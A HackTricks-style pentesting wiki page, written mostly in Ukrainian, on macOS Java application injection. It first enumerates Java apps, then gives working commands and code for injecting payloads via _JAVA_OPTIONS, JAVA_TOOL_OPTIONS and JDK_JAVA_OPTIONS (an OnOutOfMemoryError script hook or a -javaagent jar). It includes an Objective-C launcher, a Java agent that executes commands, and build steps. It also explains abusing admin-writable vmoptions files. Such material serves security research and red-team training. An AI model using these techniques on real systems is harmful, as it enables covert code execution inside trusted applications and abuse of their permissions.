# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Перерахування

Знайдіть Java applications, установлені у вашій системі. Було помічено, що Java apps у **Info.plist** містять деякі параметри Java, які містять рядок **`java.`**, тому його можна шукати:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Змінну середовища **`_JAVA_OPTIONS`** можна використовувати для ін’єкції довільних параметрів Java VM під час запуску Java-застосунку.<sup>[[1]](#references)</sup>

Java launch stack також розпізнає дві чіткіше визначені змінні з різними областями дії:

- `JAVA_TOOL_OPTIONS` зчитується під час створення VM, зокрема в деяких вбудованих шляхах запуску, які не проходять через launcher `java`. Вона може ін’єктувати параметри instrumentation, такі як `-javaagent`, `-agentlib` або `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` додається launcher `java` на початок командного рядка. Параметри, які вибирають main class або завершують роботу launcher, заборонені, але `-javaagent` дозволений.<sup>[[5]](#references)</sup>

Усі три змінні слід розглядати як засоби керування виконанням коду JVM, якщо attacker також може надати сумісний доступний для читання agent. `_JAVA_OPTIONS` є деталлю реалізації HotSpot, тому перевіряйте її відповідність конкретним vendor і version; `JAVA_TOOL_OPTIONS` або `JDK_JAVA_OPTIONS` є кращими для portable testing.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Щоб виконати це як новий процес, а не як дочірній процес поточного термінала, можна використати:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Однак цей метод спричиняє помилку у виконуваному застосунку. Більш прихованою альтернативою є створення Java agent і використання `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> Створення агента з **іншою версією Java**, ніж у застосунку, може призвести до аварійного завершення роботи агента й застосунку.

Агент може бути:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Щоб скомпілювати agent, виконайте:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
За допомогою `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Потім експортуйте змінну середовища та запустіть Java application так:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## Файл vmoptions

Цей файл підтримує зазначення **Java parameters** під час запуску Java. Ви можете використати деякі з попередніх технік, щоб змінити параметри Java і **змусити процес виконувати довільні команди**.\
Крім того, цей файл також може **включати інші файли** за допомогою директиви `include`, тому ви також можете змінити включений файл.

Більше того, деякі Java apps **завантажують більше одного** файла `vmoptions`.

Деякі застосунки, наприклад Android Studio, вказують у своїх **вивідних даних, де вони шукають** ці файли:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Якщо вони цього не роблять, ви можете перевірити це за допомогою:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Зверніть увагу, що в цьому прикладі Android Studio намагається завантажити **`/Applications/Android Studio.app.vmoptions`** — розташування, до якого будь-який користувач із групи **`admin` має доступ на запис**.

## References

- [1] [OpenJDK — аналіз `_JAVA_OPTIONS` у `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — специфікація пакета `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — налаштування параметрів JVM і властивостей платформи](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [Запускач `java` — змінна середовища запуску `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
